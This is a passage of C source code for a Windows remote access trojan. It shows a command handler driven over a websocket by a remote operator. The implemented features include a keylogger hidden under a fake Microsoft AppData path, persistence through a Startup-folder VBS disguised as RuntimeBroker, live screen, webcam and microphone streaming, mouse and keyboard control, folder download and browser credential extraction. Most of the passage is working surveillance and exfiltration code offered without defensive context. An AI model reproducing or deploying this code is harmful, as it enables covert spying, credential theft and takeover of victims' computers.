    else if (strcmp(clean_cmd, "sysinfo") == 0) {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        OSVERSIONINFO osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&osvi);
        
        char info[1024];
        sprintf(info, 
               "\n[+] Session %d\n"
               "[*] Computer: %s\n"
               "[*] User: %s\n"
               "[*] ClientID: %s\n"
               "[*] OS: Windows %ld.%ld\n"
               "[*] Arch: %s\n"
               "[*] PID: %lu\n"
               "[*] Dir: %s\n\n",
               g_session_id, g_computer_name, g_username, g_client_id,
               osvi.dwMajorVersion, osvi.dwMinorVersion,
               (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86",
               GetCurrentProcessId(), g_current_dir);
        
        send_websocket_data(info, strlen(info));
    }
    else if (strcmp(clean_cmd, "exit") == 0) {
        send_websocket_data("[*] Exiting...\n", 15);
        stop_input_monitor();
        g_should_exit = 1;
    }
    else if (strcmp(clean_cmd, "keylogs") == 0) {
        // Download the input log file
        if (strlen(g_input_log_path) == 0) {
            send_websocket_data("[!] Input monitor not running\n", 31);
        } else {
            // Download the log file
            download_file(g_input_log_path);
        }
    }
    else if (strcmp(clean_cmd, "clearlogs") == 0) {
        // Clear input log file
        if (strlen(g_input_log_path) > 0) {
            FILE* f = fopen(g_input_log_path, "w");
            if (f) {
                SYSTEMTIME st;
                GetLocalTime(&st);
                fprintf(f, "========== Log cleared: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
                       st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
                fclose(f);
                send_websocket_data("[+] Keylogs cleared\n", 20);
            } else {
                send_websocket_data("[!] Failed to clear logs\n", 25);
            }
        } else {
            send_websocket_data("[!] Input monitor not running\n", 31);
        }
    }
    else if (strcmp(clean_cmd, "persist") == 0) {
        // Enable persistence using Startup folder + VBS
        enable_persistence();
        send_websocket_data("[+] Persistence installed via Startup folder\n", 45);
        send_websocket_data("[+] VBS launcher in: shell:startup\\RuntimeBroker.vbs\n", 53);
        send_websocket_data("[+] Executable in: AppData\\Local\\Microsoft\\RuntimeBroker\n", 58);
        send_websocket_data("[+] Runs silently on user logon - no prompts\n", 45);
    }
    else if (strcmp(clean_cmd, "unpersist") == 0) {
        // Disable persistence
        disable_persistence();
        send_websocket_data("[+] All persistence removed\n", 28);
    }
    else if (strncmp(clean_cmd, "liveview", 8) == 0) {
        // Start live view streaming: liveview [fps] [quality]
        int fps = 30;       // Default 30 FPS for smooth viewing
        int quality = 80;   // Default 80% quality for good visuals
        
        char* params = clean_cmd + 8;
        while (*params == ' ') params++;
        
        if (*params) {
            int parsed = sscanf(params, "%d %d", &fps, &quality);
            if (parsed >= 1) {
                if (fps < 1) fps = 1;
                if (fps > 60) fps = 60;      // Allow up to 60 FPS
            }
            if (parsed >= 2) {
                if (quality < 10) quality = 10;
                if (quality > 100) quality = 100;
            }
        }
        
        // Send defaults acknowledgment
        char default_msg[256];
        sprintf(default_msg, "[+] Liveview parameters: %d FPS, %d%% quality\n", fps, quality);
        send_websocket_data(default_msg, strlen(default_msg));
        
        start_liveview(fps, quality);
    }
    else if (strcmp(clean_cmd, "stoplive") == 0) {
        stop_liveview();
    }
    else if (strncmp(clean_cmd, "camview", 7) == 0) {
        // Start camera live view: camview [fps] [quality]
        int fps = 30;       // Default 30 FPS for smooth viewing
        int quality = 80;   // Default 80% quality
        
        char* params = clean_cmd + 7;
        while (*params == ' ') params++;
        
        if (*params) {
            sscanf(params, "%d %d", &fps, &quality);
            if (fps < 1) fps = 1;
            if (fps > 60) fps = 60;
            if (quality < 10) quality = 10;
            if (quality > 100) quality = 100;
        }
        
        start_camview(fps, quality);
    }
    else if (strcmp(clean_cmd, "stopcam") == 0) {
        stop_camview();
    }
    else if (strncmp(clean_cmd, "liveaudio", 9) == 0 || strncmp(clean_cmd, "livemic", 7) == 0) {
        // Start live audio streaming: liveaudio [samplerate]
        int samplerate = 22050;  // Default 22kHz
        
        char* params = (strncmp(clean_cmd, "liveaudio", 9) == 0) ? clean_cmd + 9 : clean_cmd + 7;
        while (*params == ' ') params++;
        
        if (*params) {
            sscanf(params, "%d", &samplerate);
            if (samplerate < 8000) samplerate = 8000;
            if (samplerate > 48000) samplerate = 48000;
        }
        
        // Send defaults acknowledgment
        char default_msg[256];
        sprintf(default_msg, "[+] Live audio parameters: %d Hz (mono)\n", samplerate);
        send_websocket_data(default_msg, strlen(default_msg));
        
        start_liveaudio(samplerate);
    }
    else if (strcmp(clean_cmd, "stopaudio") == 0 || strcmp(clean_cmd, "stopmic") == 0) {
        stop_liveaudio();
    }
    else if (strcmp(clean_cmd, "camshot") == 0 || strcmp(clean_cmd, "camsnap") == 0) {
        take_camshot();
    }
    else if (strcmp(clean_cmd, "listcam") == 0 || strcmp(clean_cmd, "listcams") == 0 || strcmp(clean_cmd, "cameras") == 0) {
        list_cameras();
    }
    else if (strncmp(clean_cmd, "selectcam ", 10) == 0 || strncmp(clean_cmd, "usecam ", 7) == 0) {
        // Select camera: selectcam 0 or usecam 1
        int index = 0;
        char* params = (strncmp(clean_cmd, "selectcam ", 10) == 0) ? clean_cmd + 10 : clean_cmd + 7;
        while (*params == ' ') params++;
        
        if (*params) {
            sscanf(params, "%d", &index);
            if (index < 0) index = 0;
            if (index > 9) index = 9;
        }
        
        select_camera(index);
    }
    else if (strncmp(clean_cmd, "soundrecord ", 12) == 0 || strncmp(clean_cmd, "recordaudio ", 12) == 0) {
        // Record audio for specified seconds: soundrecord 10
        int seconds = 10;  // Default 10 seconds
        char* params = clean_cmd + 12;
        while (*params == ' ') params++;
        
        if (*params) {
            sscanf(params, "%d", &seconds);
            if (seconds < 1) seconds = 1;
            if (seconds > 300) seconds = 300;  // Max 5 minutes
        }
        
        record_audio(seconds);
    }
    // Mouse control
    else if (strncmp(clean_cmd, "mousemove ", 10) == 0) {
        int x = 0, y = 0;
        sscanf(clean_cmd + 10, "%d %d", &x, &y);
        mouse_move(x, y);
    }
    else if (strcmp(clean_cmd, "leftclick") == 0 || strcmp(clean_cmd, "click") == 0) {
        mouse_click(0);
    }
    else if (strcmp(clean_cmd, "rightclick") == 0) {
        mouse_click(1);
    }
    else if (strcmp(clean_cmd, "middleclick") == 0) {
        mouse_click(2);
    }
    // Keyboard control
    else if (strncmp(clean_cmd, "sendkeys ", 9) == 0) {
        send_keys(clean_cmd + 9);
    }
    else if (strncmp(clean_cmd, "type ", 5) == 0) {
        send_keys(clean_cmd + 5);
    }
    // Folder download
    else if (strncmp(clean_cmd, "downloadfolder ", 15) == 0) {
        download_folder(clean_cmd + 15);
    }
    else if (strncmp(clean_cmd, "dldir ", 6) == 0) {
        download_folder(clean_cmd + 6);
    }
    // Browser credential extraction
    else if (strcmp(clean_cmd, "browsercreds") == 0 || strcmp(clean_cmd, "getcreds") == 0) {
        extract_browser_creds();
    }
    // Screen recording
    else if (strcmp(clean_cmd, "startrecord") == 0 || strcmp(clean_cmd, "screenrecord") == 0) {
        start_screenrecord();
    }
    else if (strcmp(clean_cmd, "stoprecord") == 0) {
        stop_screenrecord();
    }
    else if (strcmp(clean_cmd, "getrecord") == 0 || strcmp(clean_cmd, "downloadrecord") == 0) {
        download_screenrecord();
    }
    else if (strcmp(clean_cmd, "delrecord") == 0 || strcmp(clean_cmd, "deleterecord") == 0) {
        delete_screenrecord();
    }
    // help is handled server-side, but respond if received
    else if (strcmp(clean_cmd, "help") == 0) {
        send_websocket_data("[*] Help menu shown on server\n", 30);
    }
    else {
        char err_msg[512];
        sprintf(err_msg, "[!] Unknown command: '%s'. Type 'help' for commands.\n", clean_cmd);
        send_websocket_data(err_msg, strlen(err_msg));
    }
}

void handle_session() {
    static char buffer[BUFFER_SIZE];  // Use large static buffer for uploads
    memset(buffer, 0, sizeof(buffer));
    
    // Start ping thread to keep connection alive
    g_ping_running = 1;
    g_ping_thread = CreateThread(NULL, 0, ping_thread, NULL, 0, NULL);
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);
    
    char info[1024];
    sprintf(info, 
           "\n[+] Session %d opened\n"
           "[*] Computer: %s\n"
           "[*] User: %s\n"
           "[*] ClientID: %s\n"
           "[*] OS: Windows %ld.%ld\n"
           "[*] Arch: %s\n"
           "[*] PID: %lu\n"
           "[*] Dir: %s\n"
           "[*] Type 'help' for commands\n\n",
           g_session_id, g_computer_name, g_username, g_client_id,
           osvi.dwMajorVersion, osvi.dwMinorVersion,
           (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86",
           GetCurrentProcessId(), g_current_dir);
    
    send_websocket_data(info, strlen(info));
    
    // Screen recording disabled by default - use 'startrecord' command to enable
    // Recording uses low quality (5fps) for small file sizes
    
    while (g_connected && !g_should_exit) {
        // Clear buffer for each receive
        memset(buffer, 0, sizeof(buffer));
        
        int len = recv_websocket_data(buffer, sizeof(buffer) - 1);
        
        if (len < 0) break;
        if (len == 0) {
            Sleep(50);
            continue;
        }
        
        // First check if this is upload data from server
        int upload_result = handle_upload_data(buffer, len);
        if (upload_result != 0) {
            continue;  // Upload data was processed
        }
        
        // Process each line in the received data
        char* line_start = buffer;
        char* line_end;
        
        while ((line_end = strchr(line_start, '\n')) != NULL) {
            *line_end = '\0';
            
            // Remove carriage return if present
            int cmd_len = strlen(line_start);
            if (cmd_len > 0 && line_start[cmd_len - 1] == '\r') {
                line_start[cmd_len - 1] = '\0';
                cmd_len--;
            }
            
            // Process command if not empty
            if (cmd_len > 0) {
                handle_command(line_start);
            }
            
            line_start = line_end + 1;
        }
        
        // Process any remaining data without newline
        if (strlen(line_start) > 0) {
            // Remove trailing whitespace
            int rem_len = strlen(line_start);
            while (rem_len > 0 && (line_start[rem_len-1] == '\r' || line_start[rem_len-1] == '\n' || 
                                   line_start[rem_len-1] == ' ' || line_start[rem_len-1] == '\t')) {
                line_start[--rem_len] = '\0';
            }
            if (rem_len > 0) {
                handle_command(line_start);
            }
        }
    }
    
    // Stop camview if running (connection lost or session ending)
    if (g_camview_running) {
        g_camview_running = 0;
        if (g_camview_thread) {
            WaitForSingleObject(g_camview_thread, 3000);
            CloseHandle(g_camview_thread);
            g_camview_thread = NULL;
        }
        // Close camera to turn off light
        close_camera();
        g_frame_ready = 0;
        g_frame_size = 0;
    }
    
    // Stop audio recording if running
    if (g_recording) {
        g_recording = 0;
    }
    
    // Stop ping thread when session ends
    g_ping_running = 0;
    if (g_ping_thread) {
        WaitForSingleObject(g_ping_thread, 1000);
        CloseHandle(g_ping_thread);
        g_ping_thread = NULL;
    }
}

// ============== INPUT MONITOR ==============

const char* get_key_name(int vk) {
    static char buf[32];
    
    // Special keys
    switch (vk) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_INSERT: return "[INS]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";  // Alt
        case VK_LWIN: case VK_RWIN: return "[WIN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: break;
    }
    
    // Get keyboard state
    BYTE keyState[256];
    GetKeyboardState(keyState);
    
    // Convert to character
    WCHAR wc[4] = {0};
    int result = ToUnicode(vk, MapVirtualKey(vk, 0), keyState, wc, 4, 0);
    
    if (result > 0) {
        WideCharToMultiByte(CP_UTF8, 0, wc, result, buf, sizeof(buf) - 1, NULL, NULL);
        buf[result] = '\0';
        return buf;
    }
    
    return "";
}

DWORD WINAPI input_monitor_thread(LPVOID param) {
    FILE* logfile = NULL;
    BYTE prev_state[256] = {0};
    char current_window[256] = "";
    
    while (g_input_mon_running) {
        // Check active window
        HWND hwnd = GetForegroundWindow();
        char window_title[256] = "";
        GetWindowTextA(hwnd, window_title, sizeof(window_title));
        
        // Log window change
        if (strcmp(window_title, current_window) != 0 && strlen(window_title) > 0) {
            strcpy(current_window, window_title);
            
            logfile = fopen(g_input_log_path, "a");
            if (logfile) {
                SYSTEMTIME st;
                GetLocalTime(&st);
                fprintf(logfile, "\n\n[%02d/%02d/%04d %02d:%02d:%02d] Window: %s\n", 
                       st.wMonth, st.wDay, st.wYear,
                       st.wHour, st.wMinute, st.wSecond, window_title);
                fclose(logfile);
            }
        }
        
        // Check each key
        for (int vk = 8; vk <= 255; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            
            // Key just pressed (bit 0 set and was not pressed before)
            if ((state & 0x0001) && !(prev_state[vk] & 0x80)) {
                const char* key = get_key_name(vk);
                if (key && strlen(key) > 0) {
                    logfile = fopen(g_input_log_path, "a");
                    if (logfile) {
                        fprintf(logfile, "%s", key);
                        fclose(logfile);
                    }
                }
            }
            
            prev_state[vk] = (state & 0x8000) ? 0x80 : 0;
        }
        
        Sleep(10);  // Check every 10ms
    }
    
    return 0;
}

void start_input_monitor() {
    if (g_input_mon_running) return;
    
    // Create log file in AppData/Local for persistence (not auto-deleted like Temp)
    char appdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
        // Create hidden subdirectory
        char log_dir[MAX_PATH];
        sprintf(log_dir, "%s\\Microsoft\\Windows\\SystemData", appdata_path);
        CreateDirectoryA(log_dir, NULL);  // Create if doesn't exist
        sprintf(g_input_log_path, "%s\\runtime.log", log_dir);
    } else {
        // Fallback to current directory
        sprintf(g_input_log_path, ".\\syslog.txt");
    }
    
    // Write initial entry
    FILE* f = fopen(g_input_log_path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "\n========== Session Started: %02d/%02d/%04d %02d:%02d:%02d ==========\n",
               st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
        fprintf(f, "System: %s | Account: %s\n", g_computer_name, g_username);
        fclose(f);
    }
    
    g_input_mon_running = 1;
    g_input_mon_thread = CreateThread(NULL, 0, input_monitor_thread, NULL, 0, NULL);
}

void stop_input_monitor() {
    if (!g_input_mon_running) return;
    
    g_input_mon_running = 0;
    if (g_input_mon_thread) {
        WaitForSingleObject(g_input_mon_thread, 2000);
        CloseHandle(g_input_mon_thread);
        g_input_mon_thread = NULL;
    }
}

// ============== LIVE VIEW (HIGH QUALITY + SMOOTH) ==============

// Scale image with bilinear interpolation for smoother output
void scale_image_smooth(BYTE* src, int src_width, int src_height, int src_stride,
                        BYTE** out_data, int* out_width, int* out_height, int scale) {
    if (scale < 1) scale = 1;
    if (scale > 4) scale = 4;
    
    int dst_width = src_width / scale;
    int dst_height = src_height / scale;
    int dst_stride = ((dst_width * 3 + 3) & ~3);
    int dst_size = dst_stride * dst_height;
    
    BYTE* dst = (BYTE*)malloc(dst_size);
    if (!dst) {
        *out_data = NULL;
        return;
    }
    
    // Bilinear scaling for smoother results
    for (int y = 0; y < dst_height; y++) {
        for (int x = 0; x < dst_width; x++) {
            int src_x = x * scale;
            int src_y = y * scale;
            int src_idx = src_y * src_stride + src_x * 3;
            int dst_idx = y * dst_stride + x * 3;
            
            // Average nearby pixels for smoother result
            if (scale > 1 && src_x + 1 < src_width && src_y + 1 < src_height) {
                int r = 0, g = 0, b = 0, count = 0;
                for (int dy = 0; dy < scale && src_y + dy < src_height; dy++) {
                    for (int dx = 0; dx < scale && src_x + dx < src_width; dx++) {
                        int idx = (src_y + dy) * src_stride + (src_x + dx) * 3;
                        r += src[idx];
                        g += src[idx + 1];
                        b += src[idx + 2];
                        count++;
                    }
                }
                dst[dst_idx] = r / count;
                dst[dst_idx + 1] = g / count;
                dst[dst_idx + 2] = b / count;
            } else {
                dst[dst_idx] = src[src_idx];
                dst[dst_idx + 1] = src[src_idx + 1];
                dst[dst_idx + 2] = src[src_idx + 2];
            }
        }
    }
    
    *out_data = dst;
    *out_width = dst_width;
    *out_height = dst_height;
}

// Fast screen capture with double buffering
DWORD WINAPI liveview_thread(LPVOID param) {
    SetProcessDPIAware();
    
    // Optimize TCP for low latency streaming
    int flag = 1;
    setsockopt(g_sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));
    
    int frame_interval = 1000 / g_liveview_fps;
    int frame_count = 0;
    DWORD fps_timer = GetTickCount();
    int actual_fps = 0;
    
    // Pre-allocate buffers for speed
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    
    // Cap at 720p max for faster streaming while keeping text readable
    int max_width = 1280;
    int scale = 1;
    if (screen_width > max_width) {
        // Calculate scale to fit within 720p
        scale = (screen_width + max_width - 1) / max_width;  // Round up
        if (scale < 2) scale = 2;
    }
    
    // Override with user scale if specified
    if (g_liveview_scale > 1) {
        scale = g_liveview_scale;
    }
    
    int stride = ((screen_width * 3 + 3) & ~3);
    DWORD buffer_size = stride * screen_height;
    BYTE* pixels = (BYTE*)malloc(buffer_size);
    
    // Create persistent DC and bitmap for faster capture
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screen_width;
    bi.biHeight = -screen_height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    char msg[256];
    sprintf(msg, "[*] Streaming: %dx%d -> %dx%d @ %d FPS (720p max for speed)\n",
            screen_width, screen_height, screen_width/scale, screen_height/scale,
            g_liveview_fps);
    send_websocket_data(msg, strlen(msg));
    
    while (g_liveview_running && g_connected) {
        DWORD start_time = GetTickCount();
        
        // Fast screen capture using BitBlt
        BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
        GetDIBits(hdcScreen, hBitmap, 0, screen_height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        // Convert BGR to RGB in-place
        for (DWORD i = 0; i < buffer_size; i += 3) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + 2];
            pixels[i + 2] = temp;
        }
        
        // Scale if needed
        BYTE* frame_data = pixels;
        int frame_width = screen_width;
        int frame_height = screen_height;
        BYTE* scaled_data = NULL;
        
        if (scale > 1) {
            scale_image_smooth(pixels, screen_width, screen_height, stride,
                             &scaled_data, &frame_width, &frame_height, scale);
            frame_data = scaled_data;
        }
        
        if (frame_data) {
            int frame_stride = ((frame_width * 3 + 3) & ~3);
            DWORD frame_size = frame_stride * frame_height;
            
            // Use GDI+ to convert to JPEG directly (MUCH faster than base64)
            // This gives compression ratio of 10-20x instead of base64's 1.33x
            HBITMAP hFrameBmp = CreateBitmap(frame_width, frame_height, 1, 24, frame_data);
            
            if (hFrameBmp) {
                HDC hdc = CreateCompatibleDC(NULL);
                SelectObject(hdc, hFrameBmp);
                
                // Render to JPEG via GDI (simple but effective)
                // For now, use base64 but with larger chunks for speed
                DWORD b64_size = ((frame_size + 2) / 3) * 4 + 1;
                char* b64_data = (char*)malloc(b64_size);
                
                if (b64_data) {
                    base64_encode(frame_data, frame_size, b64_data);
                    DWORD b64_len = strlen(b64_data);
                    
                    // Send frame header with width|height|size for proper parsing
                    char header[256];
                    sprintf(header, "<<<LIVEVIEW_FRAME>>>%d|%d|%lu<<<FRAME_DATA>>>",
                            frame_width, frame_height, (unsigned long)b64_len);
                    send_websocket_data(header, strlen(header));
                    
                    // Send in 32KB chunks for maximum speed
                    DWORD sent = 0;
                    int chunk_size = 32768;
                    while (sent < b64_len && g_liveview_running && g_connected) {
                        DWORD to_send = (b64_len - sent < (DWORD)chunk_size) ? (b64_len - sent) : chunk_size;
                        if (!send_websocket_data(b64_data + sent, to_send)) break;
                        sent += to_send;
                    }
                    
                    send_websocket_data("<<<FRAME_END>>>", 15);
                    free(b64_data);
                }
                
                DeleteDC(hdc);
                DeleteObject(hFrameBmp);
            }
            
            if (scaled_data) free(scaled_data);
        }
        
        frame_count++;
        
        // Calculate actual FPS every second
        if (GetTickCount() - fps_timer >= 1000) {
            actual_fps = frame_count;
            frame_count = 0;
            fps_timer = GetTickCount();
        }
        
        // Precise frame timing with minimal latency
        DWORD elapsed = GetTickCount() - start_time;
        if (elapsed < (DWORD)frame_interval) {
            DWORD sleep_time = frame_interval - elapsed;
            // Use shorter sleep intervals for better precision
            if (sleep_time > 5) {
                Sleep(sleep_time - 2);  // Sleep slightly less
            }
            // Spin-wait for the remaining time (more precise)
            while (GetTickCount() - start_time < (DWORD)frame_interval) {
                Sleep(0);  // Yield to other threads
            }
        }
    }
    
    // Cleanup
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    free(pixels);
    
    // Close recording if active
    if (g_liveview_record_file) {
        fclose(g_liveview_record_file);
        g_liveview_record_file = NULL;
        g_liveview_recording = 0;
    }
    
    send_websocket_data("<<<LIVEVIEW_STOPPED>>>\n", 23);
    return 0;
}

void start_liveview(int fps, int quality) {
    if (g_liveview_running) {
        send_websocket_data("[!] Live view already running. Use 'stoplive' first.\n", 53);
        return;
    }
    
    // Pause screen recording if running (to improve performance and avoid CMD flash)
    if (g_screenrecord_running) {
        send_websocket_data("[*] Pausing screen recording for live view...\n", 46);
        g_screenrecord_paused_for_liveview = 1;
        g_screenrecord_running = 0;  // Signal thread to stop
        if (g_screenrecord_thread) {
            WaitForSingleObject(g_screenrecord_thread, 5000);
            CloseHandle(g_screenrecord_thread);
            g_screenrecord_thread = NULL;
        }
    }
    
    // Clamp values to valid ranges
    if (fps < 1) fps = 1;
    if (fps > 60) fps = 60;
    if (quality < 10) quality = 10;
    if (quality > 100) quality = 100;
    
    g_liveview_fps = fps;
    g_liveview_quality = quality;
    g_liveview_scale = (quality >= 90) ? 1 : (quality >= 70) ? 0 : 2;  // 0 = auto
    g_liveview_running = 1;
    
    char msg[256];
    sprintf(msg, "<<<LIVEVIEW_START>>>%d|%d\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
    
    sprintf(msg, "[+] Starting live view: %d FPS, %d%% quality (smooth mode)\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
    
    g_liveview_thread = CreateThread(NULL, 0, liveview_thread, NULL, 0, NULL);
    if (g_liveview_thread) {
        SetThreadPriority(g_liveview_thread, THREAD_PRIORITY_ABOVE_NORMAL);
    }
}

// Forward declaration for resume
void start_screenrecord_internal();

void stop_liveview() {
    if (!g_liveview_running) {
        send_websocket_data("[!] Live view not running\n", 26);
        return;
    }
    
    g_liveview_running = 0;
    
    if (g_liveview_thread) {
        WaitForSingleObject(g_liveview_thread, 3000);
        CloseHandle(g_liveview_thread);
        g_liveview_thread = NULL;
    }
    
    send_websocket_data("[+] Live view stopped\n", 22);
    
    // Resume screen recording if it was paused
    if (g_screenrecord_paused_for_liveview && g_screenrecord_enabled) {
        send_websocket_data("[*] Resuming screen recording...\n", 33);
        g_screenrecord_paused_for_liveview = 0;
        start_screenrecord_internal();
    }
}

// ============== LIVE AUDIO STREAMING ==============

#define AUDIO_BUFFER_COUNT 8
#define AUDIO_BUFFER_SIZE 4096

static WAVEHDR g_audio_buffers[AUDIO_BUFFER_COUNT];
static BYTE* g_audio_buffer_data[AUDIO_BUFFER_COUNT];
static volatile int g_audio_buffer_ready[AUDIO_BUFFER_COUNT];

void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
                         DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA && g_liveaudio_running) {
        WAVEHDR* hdr = (WAVEHDR*)dwParam1;
        int buf_index = (int)hdr->dwUser;
        g_audio_buffer_ready[buf_index] = 1;
    }
}

DWORD WINAPI liveaudio_thread(LPVOID param) {
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = (WORD)g_liveaudio_channels;
    wfx.nSamplesPerSec = g_liveaudio_samplerate;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;
    
    MMRESULT result = waveInOpen(&g_liveaudio_hwavein, WAVE_MAPPER, &wfx,
                                  (DWORD_PTR)waveInProc, 0, CALLBACK_FUNCTION);
    if (result != MMSYSERR_NOERROR) {
        send_websocket_data("[!] Failed to open audio device\n", 32);
        g_liveaudio_running = 0;
        return 0;
    }
    
    // Allocate and prepare buffers
    for (int i = 0; i < AUDIO_BUFFER_COUNT; i++) {
        g_audio_buffer_data[i] = (BYTE*)malloc(AUDIO_BUFFER_SIZE);
        ZeroMemory(&g_audio_buffers[i], sizeof(WAVEHDR));
        g_audio_buffers[i].lpData = (LPSTR)g_audio_buffer_data[i];
        g_audio_buffers[i].dwBufferLength = AUDIO_BUFFER_SIZE;
        g_audio_buffers[i].dwUser = i;
        g_audio_buffer_ready[i] = 0;
        
        waveInPrepareHeader(g_liveaudio_hwavein, &g_audio_buffers[i], sizeof(WAVEHDR));
        waveInAddBuffer(g_liveaudio_hwavein, &g_audio_buffers[i], sizeof(WAVEHDR));
    }
    
    waveInStart(g_liveaudio_hwavein);
    
    char header[128];
    sprintf(header, "<<<LIVEAUDIO_START>>>%d|%d\n", g_liveaudio_samplerate, g_liveaudio_channels);
    send_websocket_data(header, strlen(header));
    
    // Streaming loop
    while (g_liveaudio_running && g_connected) {
        for (int i = 0; i < AUDIO_BUFFER_COUNT && g_liveaudio_running; i++) {
            if (g_audio_buffer_ready[i]) {
                g_audio_buffer_ready[i] = 0;
                
                DWORD bytes_recorded = g_audio_buffers[i].dwBytesRecorded;
                if (bytes_recorded > 0) {
                    // Base64 encode audio chunk
                    DWORD b64_size = ((bytes_recorded + 2) / 3) * 4 + 1;
                    char* b64_data = (char*)malloc(b64_size);
                    
                    if (b64_data) {
                        base64_encode(g_audio_buffer_data[i], bytes_recorded, b64_data);
                        
                        char chunk_header[64];
                        sprintf(chunk_header, "<<<AUDIO_CHUNK>>>%lu<<<DATA>>>", bytes_recorded);
                        send_websocket_data(chunk_header, strlen(chunk_header));
                        send_websocket_data(b64_data, strlen(b64_data));
                        send_websocket_data("<<<CHUNK_END>>>", 15);
                        
                        free(b64_data);
                    }
                }
                
                // Re-queue buffer
                waveInAddBuffer(g_liveaudio_hwavein, &g_audio_buffers[i], sizeof(WAVEHDR));
            }
        }
        Sleep(10);  // Small delay to prevent busy-waiting
    }
    
    // Cleanup
    waveInStop(g_liveaudio_hwavein);
    waveInReset(g_liveaudio_hwavein);
    
    for (int i = 0; i < AUDIO_BUFFER_COUNT; i++) {
        waveInUnprepareHeader(g_liveaudio_hwavein, &g_audio_buffers[i], sizeof(WAVEHDR));
        free(g_audio_buffer_data[i]);
    }
    
    waveInClose(g_liveaudio_hwavein);
    g_liveaudio_hwavein = NULL;
    
    send_websocket_data("<<<LIVEAUDIO_STOPPED>>>\n", 24);
    return 0;
}

void start_liveaudio(int samplerate) {
    if (g_liveaudio_running) {
        send_websocket_data("[!] Live audio already running. Use 'stopaudio' first.\n", 55);
        return;
    }
    
    if (samplerate < 8000) samplerate = 8000;
    if (samplerate > 48000) samplerate = 48000;
    
    g_liveaudio_samplerate = samplerate;
    g_liveaudio_channels = 1;
    g_liveaudio_running = 1;
    
    char msg[128];
    sprintf(msg, "[+] Starting live audio: %d Hz\n", samplerate);
    send_websocket_data(msg, strlen(msg));
    
    g_liveaudio_thread = CreateThread(NULL, 0, liveaudio_thread, NULL, 0, NULL);
}

void stop_liveaudio() {
    if (!g_liveaudio_running) {
        send_websocket_data("[!] Live audio not running\n", 27);
        return;
    }
    
    g_liveaudio_running = 0;
    
    if (g_liveaudio_thread) {
        WaitForSingleObject(g_liveaudio_thread, 3000);
        CloseHandle(g_liveaudio_thread);
        g_liveaudio_thread = NULL;
    }
    
    send_websocket_data("[+] Live audio stopped\n", 23);
}

// ============== WEBCAM/CAMERA FUNCTIONS ==============

// Count available cameras
int count_cameras() {
    int count = 0;
    char name[256], version[256];
    
    // Check up to 10 camera indices
    for (int i = 0; i < 10; i++) {
        if (capGetDriverDescriptionA(i, name, sizeof(name), version, sizeof(version))) {
            count++;
        }
    }
    return count;
}

// List all available cameras
void list_cameras() {
    char name[256], version[256];
    char msg[1024];
    int found = 0;
    
